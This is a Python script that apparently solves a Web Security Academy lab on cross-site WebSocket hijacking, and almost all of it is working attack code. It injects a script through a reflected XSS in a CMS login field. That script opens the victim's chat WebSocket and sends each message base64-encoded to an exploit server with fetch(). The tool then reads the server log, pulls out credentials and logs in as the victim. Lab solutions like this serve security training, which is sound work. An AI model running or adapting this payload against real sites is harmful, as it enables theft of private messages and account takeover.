import base64
import html
import re
import time
import urllib.parse

import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def submit_exploit_server(session, url, response_file, response_head, response_body, form_action):
    params = {
        "urlIsHttps": "on",
        "responseFile": response_file,
        "responseHead": response_head,
        "responseBody": response_body,
        "formAction": form_action
    }
    resp = session.post(url, data=params, verify=False, allow_redirects=True)
    if resp.status_code not in (200, 302):
        raise ValueError(f"Exploit server request failed with status code {resp.status_code}")
    return True


def fetch_access_log(session, exploit_host):
    resp = session.get(f"{exploit_host}/log", verify=False)
    return resp.text


def extract_leaked_messages(log_html):
    b64_values = re.findall(r'GET /exploit\?message=([^\s&"]+) HTTP', log_html)
    messages = []
    for value in b64_values:
        try:
            decoded_b64 = urllib.parse.unquote(value)
            decoded_b64 += "=" * (-len(decoded_b64) % 4)
            messages.append(base64.b64decode(decoded_b64).decode("utf-8", errors="replace"))
        except Exception:
            continue
    return messages


def extract_credentials(messages):
    blob = html.unescape("\n".join(messages))

    
    match = re.search(r"\b(\w+),\s*it's\s+([\w!@#$%^&*\-]+)", blob, re.IGNORECASE)
    if match:
        return match.group(1), match.group(2)

    match = re.search(r"administrator[^\w]{1,10}([A-Za-z0-9!@#$%^&*_\-]{6,})", blob, re.IGNORECASE)
    if match:
        return "administrator", match.group(1)

    match = re.search(r"password[^\w]{1,10}([A-Za-z0-9!@#$%^&*_\-]{6,})", blob, re.IGNORECASE)
    if match:
        return "administrator", match.group(1)

    match = re.search(r"([A-Za-z0-9_.+-]{3,20}):([A-Za-z0-9!@#$%^&*_\-]{6,})", blob)
    if match:
        return match.group(1), match.group(2)

    return None, None


def login(host, username, password):
    session = requests.Session()
    login_page = session.get(f"{host}/login", verify=False)
    soup = BeautifulSoup(login_page.text, "html.parser")
    csrf_input = soup.find("input", {"name": "csrf"})
    csrf = csrf_input["value"] if csrf_input else None

    data = {"username": username, "password": password}
    if csrf:
        data["csrf"] = csrf

    resp = session.post(f"{host}/login", data=data, verify=False, allow_redirects=True)
    return session, resp


def is_lab_solved(session, host):
    resp = session.get(f"{host}/", verify=False)
    return "Congratulations, you solved the lab!" in resp.text


def main():
    host = "https://0a9800f9049f95c68345c5dc009700bd.web-security-academy.net"
    cms_login_url = "https://cms-0a9800f9049f95c68345c5dc009700bd.web-security-academy.net/login"
    exploit_host = "https://exploit-0a1f000404c195ad83f9c46c01a3005b.exploit-server.net"

    lab_domain = urllib.parse.urlparse(host).netloc

    ws_hijack_payload = f'''<script>
var webSocket = new WebSocket("wss://{lab_domain}/chat");

webSocket.onopen = function (evt) {{
    webSocket.send("READY");
}}

webSocket.onmessage = function (evt) {{
    var message = evt.data;
    fetch("{exploit_host}/exploit?message=" + btoa(message));
}};
</script>'''

    encoded_ws_payload = urllib.parse.quote(ws_hijack_payload, safe="")

    delivery_payload = (
        f'<script>\n'
        f'document.location="{cms_login_url}?username={encoded_ws_payload}&password=tftyruftu";\n'
        f'</script>'
    )

    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"

    exploit_session = requests.Session()
    submit_exploit_server(exploit_session, f"{exploit_host}/", "/exploit", response_head, delivery_payload, "STORE")
    print("Exploit stored.")

    submit_exploit_server(exploit_session, f"{exploit_host}/", "/exploit", response_head, delivery_payload, "DELIVER_TO_VICTIM")
    print("Exploit delivered to victim.")

    messages = []
    for _ in range(6):
        time.sleep(5)
        log_html = fetch_access_log(exploit_session, exploit_host)
        messages = extract_leaked_messages(log_html)
        if messages:
            break

    if not messages:
        print("No exfiltrated chat messages found in access log.")
        print("ya siks")
        return

    print("Leaked chat messages:")
    for msg in messages:
        print(f"  {msg}")

    username, password = extract_credentials(messages)
    if not username or not password:
        print("Could not auto-extract credentials from leaked messages.")
        print("ya siks")
        return

    print(f"Extracted credentials: {username}:{password}")

    lab_session, login_resp = login(host, username, password)
    if "my-account" not in login_resp.url and "Log out" not in login_resp.text:
        print("Login with extracted credentials failed.")
        print("ya siks")
        return

    print("Logged in successfully.")

    if is_lab_solved(lab_session, host):
        print("Koated !!")
    else:
        print("ya siks")


if __name__ == "__main__":
    main()
